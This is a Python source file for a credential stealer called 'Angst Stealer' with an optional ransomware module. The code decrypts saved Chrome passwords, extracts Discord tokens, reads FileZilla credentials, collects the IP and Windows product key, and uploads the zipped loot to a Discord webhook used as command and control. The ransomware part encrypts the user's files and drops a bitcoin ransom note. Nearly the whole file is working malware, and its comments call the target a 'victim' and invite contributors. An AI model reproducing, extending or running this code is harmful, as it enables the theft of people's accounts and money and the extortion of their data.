import os
import base64

import sqlite3
from Crypto.Cipher import AES
import json
import win32crypt
import shutil

import re

import base64
import xml.etree.ElementTree as ET

from Crypto.Util.Padding import pad, unpad

import requests
import zipfile


class User(object):
	"""
	Simply returns the userdata of the victim and returns it.
	"""
	def __init__(self):
		self.userdata = ""
		self.get_userdata()

	def get_userdata(self):
		"""
		Gets the:
			- IP
			- Username
			- Computername
			- Windows Activation Key
		"""
		try:
			ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
			user = os.getlogin()
			cname = os.getenv('COMPUTERNAME')
			wkey = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
			self.userdata = "==== %s ====\nIP: %s\nUSERNAME: %s\nCOMPUTERNAME: %s\nWINDOWSKEY: %s" % (user, ip, user, cname, wkey)
		except:
			pass

class Send(object):
    """
    Sends content to our webhook acting as a cnc
    """
    def __init__(self, webhook, userdata, ransomware_key, renabled):
        self.webhook = webhook
        self.userdata = userdata
        self.ransomware_key = ransomware_key
        self.renabled = renabled
        self.send_file()

    def zip_dir(self, path, zipf):
        """
        Zips the folder path
        """
        for root, dirs, files in os.walk(path):
            for file in files:
                zipf.write(os.path.join(path, file), file)

    def send_file(self):
        """
        Sends our current zipped angst directory to our webhook
        """
        ap = os.getenv("LOCALAPPDATA")
        temp = os.path.join(ap, "Angst")
        new = os.path.join(ap, 'Angst-[%s].zip' % os.getlogin())
        zipf = zipfile.ZipFile(new, 'w', zipfile.ZIP_DEFLATED)
        self.zip_dir(temp, zipf)
        zipf.close()
        if self.renabled == False: key = "Ransomware: Not Enabled"
        else: key = "RansomwareKey: %s" % self.ransomware_key.decode()
        alert = {
                  "avatar_url":"https://i.imgur.com/tkQZZL2.png",
                  "name":"Angst Stealer",
                  "embeds": [
                    {
                      "title": "Angst Stealer",
                      "description": "A new victim has run Angst, here are the current user stats of the user:\n ```asciidoc\n%s\n%s\n```" % (self.userdata, key),
                      "color": 15146294,

                      "thumbnail": {
                        "url": "https://i.imgur.com/tkQZZL2.png"
                      }
                    }
                  ]
                }
        requests.post(self.webhook,json=alert)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})



FILETYPES = ['.txt','.exe','.php','.pl','.7z','.rar','.m4a','.wma','.avi','.wmv','.csv','.d3dbsp','.sc2save','.sie','.sum','.ibank','.t13','.t12','.qdf','.gdb','.tax','.pkpass','.bc6','.bc7','.bkp','.qic','.bkf','.sidn','.sidd','.mddata','.itl','.itdb','.icxs','.hvpl','.hplg','.hkdb','.mdbackup','.syncdb','.gho','.cas','.svg','.map','.wmo','.itm','.sb','.fos','.mcgame','.vdf','.ztmp','.sis','.sid','.ncf','.menu','.layout','.dmp','.blob','.esm','.001','.vtf','.dazip','.fpk','.mlx','.kf','.iwd','.vpk','.tor','.psk','.rim','.w3x','.fsh','.ntl','.arch00','.lvl','.snx','.cfr','.ff','.vpp_pc','.lrf','.m2','.mcmeta','.vfs0','.mpqge','.kdb','.db0','.mp3','.upx','.rofl','.hkx','.bar','.upk','.das','.iwi','.litemod','.asset','.forge','.ltx','.bsa','.apk','.re4','.sav','.lbf','.slm','.bik','.epk','.rgss3a','.pak','.big','.unity3d','.wotreplay','.xxx','.desc','.py','.m3u','.flv','.js','.css','.rb','.png','.jpeg','.p7c','.p7b','.p12','.pfx','.pem','.crt','.cer','.der','.x3f','.srw','.pef','.ptx','.r3d','.rw2','.rwl','.raw','.raf','.orf','.nrw','.mrwref','.mef','.erf','.kdc','.dcr','.cr2','.crw','.bay','.sr2','.srf','.arw','.3fr','.dng','.jpeg','.jpg','.cdr','.indd','.ai','.eps','.pdf','.pdd','.psd','.dbfv','.mdf','.wb2','.rtf','.wpd','.dxg','.xf','.dwg','.pst','.accdb','.mdb','.pptm','.pptx','.ppt','.xlk','.xlsb','.xlsm','.xlsx','.xls','.wps','.docm','.docx','.doc','.odb','.odc','.odm','.odp','.ods','.odt','.sql','.zip','.tar','.tar.gz','.tgz','.biz','.ocx','.html','.htm','.3gp','.srt','.cpp','.mid','.mkv','.mov','.asf','.mpeg','.vob','.mpg','.fla','.swf','.wav','.qcow2','.vdi','.vmdk','.vmx','.gpg','.aes','.ARC','.PAQ','.tar.bz2','.tbk','.bak','.djv','.djvu','.bmp','.cgm','.tif','.tiff','.NEF','.cmd','.class','.jar','.java','.asp','.brd','.sch','.dch','.dip','.vbs','.asm','.pas','.ldf','.ibd','.MYI','.MYD','.frm','.dbf','.SQLITEDB','.SQLITE3','.asc','.lay6','.lay','.ms11(Securitycopy)','.sldm','.sldx','.ppsm','.ppsx','.ppam','.docb','.mml','.sxm','.otg','.slk','.xlw','.xlt','.xlm','.xlc','.dif','.stc','.sxc','.ots','.ods','.hwp','.dotm','.dotx','.docm','.DOT','.max','.xml','.uot','.stw','.sxw','.ott','.csr','.key','wallet.dat']

class Ransomware(object):
    def __init__(self, key, target_dir, extenstion, btcAddy, email):
        self.target_dir = target_dir
        self.extenstion = extenstion
        self.btcAddy = btcAddy
        self.email = email
        self.crypto = AES.new(key, AES.MODE_ECB)
        self.angst()

    def encrypt(self, filepath):
        """
        Encrypts given text
        """
        try:
            with open(filepath, "rb") as file:
                content = self.crypto.encrypt(pad(file.read(),32))
                with open(filepath, "wb") as newF:
                    newF.write(content)
                    newF.flush()
                    newF.close()
            os.rename(filepath, filepath + self.extenstion)
        except:
            pass

    def angst(self):
        """
        The full ransomware module
        """
        for subdir, dirs, files in os.walk(self.target_dir):
            for file in files:
                filepath = subdir + os.sep + file
                for ft in FILETYPES:
                    if ft in filepath:
                        self.encrypt(filepath)
        self.readme()

    def readme(self):
        """
        The ransomwares readme note
        """
        ransomnote = """Hello, 
\tCongrats you have been hit by Angst so lets talk about recovering your files. First off don't even waste your time with free decrypters.
This can and will result in file corruption if not in a total loss of files. We have included steps for fully and properly decrypting your files, if you fail
to complete these steps then you will loose your files.
----------------------------------
1. Download BitPay: https://bitpay.com/ This can also be downloaded from the microsoft store.
2. Purchase $75 in bitcoin using the buy crypto option
3. Send that $75 in bitcoin to this addr: %s
4. After you have sent the money send an email to %s saying that you have paid and please include your user id.
5. Wait roughly 4 hours, I will send you your decrypter and key which can be used to decrypt all files encrypted by the ransomware.
----------------------------------
""" % (self.btcAddy, self.email)

        readme = os.environ["HOMEPATH"] + "\\Desktop\\readme.txt"
        with open(readme, "w",encoding="utf-8") as important:
            important.write(ransomnote)
            important.flush()
            important.close()

class FileZilla(object):
    """
    Simple implementation of grabbing saved passwords from the filezilla
    config logs
    """
    def __init__(self):
        self.saved = ""
        self.grab_saved()

    def grab_saved(self):
        """
        Grabs stored passwords from the default filezilla config file, 
        if non-existant then it will return nothing.
        """
        filezilla =  os.path.join(os.getenv("APPDATA"), "FileZilla")
        if os.path.exists(filezilla):
            saved_pass_file = os.path.join(filezilla, "recentservers.xml")
            if os.path.exists(saved_pass_file):
                xml_tree = ET.parse(saved_pass_file).getroot()
                if xml_tree.findall('RecentServers/Server'):
                    servers = xml_tree.findall('RecentServers/Server')
                else:
                    servers = xml_tree.findall('Servers/Server')
 
                for server in servers:
                    host = server.find('Host')
                    port = server.find('Port')
                    user = server.find('User')
                    password = server.find('Pass')
                    self.saved += "==== %s ====\nHOST: %s\nPORT: %s\nUSER: %s\nPASS: %s\n" % (host.text, host.text, port.text, user.text, base64.b64decode(password.text).decode())

class Discord():
	def __init__(self):
		self.tokens = []
		self.saved = ""
		self.regex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
		self.discord()
		self.chrome()
		self.neatify()

	def discord(self):
		discordPaths = [os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb',
		os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
		os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb']

		for location in discordPaths:
			try:
				if os.path.exists(location):
					for file in os.listdir(location):
						with open(f"{location}\\{file}", errors='ignore') as _data:
							regex = re.findall(self.regex, _data.read())
							if regex:
								for token in regex:
									self.tokens.append(token)
			except:
				pass

	def chrome(self):
		chromie = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'
		try:
			if os.path.exists(chromie):
				for file in os.listdir(chromie):
					with open(f"{chromie}\\{file}", errors='ignore') as _data:
						regex = re.findall(self.regex, _data.read())
						if regex:
							for token in regex:
								self.tokens.append(token)
		except Exception as e:
			pass

	def neatify(self):
		for token in self.tokens:
			self.saved += "%s\n" % token

APP_DATA = os.environ['LOCALAPPDATA']

class Chrome(object):
    """
    Returns saved:
        - Chrome passwords
        - Chrome emails
        - Chrome URLS
    """
    def __init__(self):
        self.stored = ""
        self.lad = os.environ["LOCALAPPDATA"]
        self.temp = os.environ["APPDATA"] + "Angst"
        self.cgrab()

    def chrome_key(self):
        """
        Returns the chrome saved key
        """
        with open(os.path.join(self.lad,
                                "Google\\Chrome\\User Data\\Local State"),
                 encoding="utf-8") as k:
            ck = json.loads(k.read())
        return win32crypt.CryptUnprotectData(
                    base64.b64decode(ck["os_crypt"]["encrypted_key"])[5:],
                    None,
                    None,
                    None,
                    0)[1]

    def locate_db(self):
        """
        Locates and moves our SQLITE database so it isn't locked
        """
        full_path = os.path.join(APP_DATA, 
            'Google\\Chrome\\User Data\\Default\\Login Data')
        temp_path = os.path.join(APP_DATA,'sqlite_file')
        if os.path.exists(temp_path): os.remove(temp_path)
        shutil.copyfile(full_path, temp_path)
        return full_path

    def decrypt_pass(self, cont):
        """
        Decrypts our existing password
        """
        try:
            iv = cont[3:15]
            data = cont[15:]
            ciph = AES.new(self.chrome_key(), AES.MODE_GCM, iv)
            decrypted = ciph.decrypt(data)
            decrypted = decrypted[:-16].decode()
            return decrypted
        except:
            decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)
            return decrypted[1]

    def cgrab(self):
        """
        Grabs all of the credentials from the user
        """
        try:
            db = self.locate_db()
            db2 = shutil.copy(db, APP_DATA)
            conn = sqlite3.connect(db2)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value  from logins")
            for item in cursor.fetchall():
                if item[0] != "":
                    self.stored += (f"{item[0]:<90}|{item[1]:<40}|{self.decrypt_pass(item[2])}\n")
        except:
            pass

CONFIG = {
    "webhook" : "",
    "chrome" : True,
    "filezilla":False,
    "userdata":True,
    "discord":True,
    "ransomware" : {
        "enabled" : False,
        "target_dir" : "C:\\Users\\testuser", #remove the testuser at the end
        "extenstion" : ".angst",
        "btcAddy" : "",
        "email" : "demo.tmpacc12@gmail.com"
    }
}

class AngstStealer():
    """
    The main class for angst stealer, it loads all of the plugins
    and then proceeds to run the ransomware at the end if its enabled.
    The overall malware logic could and can be improved. Contributers
    are appreciated.
    """
    def __init__(self):
        self.filezilla = FileZilla()
        self.user = User()
        self.chrome = Chrome()
        self.discord = Discord()
        self.ransomware_key = os.urandom(32)
        self.log()
        self.send = Send(CONFIG["webhook"],
                         self.user.userdata,
                         base64.b64encode(self.ransomware_key),
                         CONFIG["ransomware"]["enabled"])
        self.rangst()

    def log(self):
        """
        The code which saves all the logs, this coulde be for sure be improved
        however since I've gotten lazy I will leave it like this since it works.
        """
        app_data = os.getenv("LOCALAPPDATA")
        temp = os.path.join(app_data, "Angst")
        os.mkdir(temp)
        if self.filezilla.saved != "" and CONFIG["filezilla"] == True:
            with open(temp + "\\filezilla.txt", "w") as filezilla_file:
                filezilla_file.write(self.filezilla.saved)
                filezilla_file.flush()
                filezilla_file.close()

        if self.user.userdata != "" and CONFIG["userdata"] == True:
            with open(temp + "\\user.txt", "w") as user_file:
                user_file.write(self.user.userdata)
                user_file.flush()
                user_file.close()

        if self.chrome.stored != "" and CONFIG["chrome"] == True:
            with open(temp + "\\chrome.txt", "w") as chrome_file:
                chrome_file.write(self.chrome.stored)
                chrome_file.flush()
                chrome_file.close()

        if self.discord.saved != "" and CONFIG["discord"] == True:
            with open(temp + "\\discord.txt", "w") as discord_file:
                discord_file.write(self.discord.saved)
                discord_file.flush()
                discord_file.close()

    def rangst(self):
        """
        The ransomware portion of angst.
        """
        if CONFIG["ransomware"]["enabled"]:
            Ransomware(self.ransomware_key,
                       CONFIG["ransomware"]["target_dir"],
                       CONFIG["ransomware"]["extenstion"],
                       CONFIG["ransomware"]["btcAddy"],
                       CONFIG["ransomware"]["email"])

if __name__ == "__main__":
    AngstStealer()
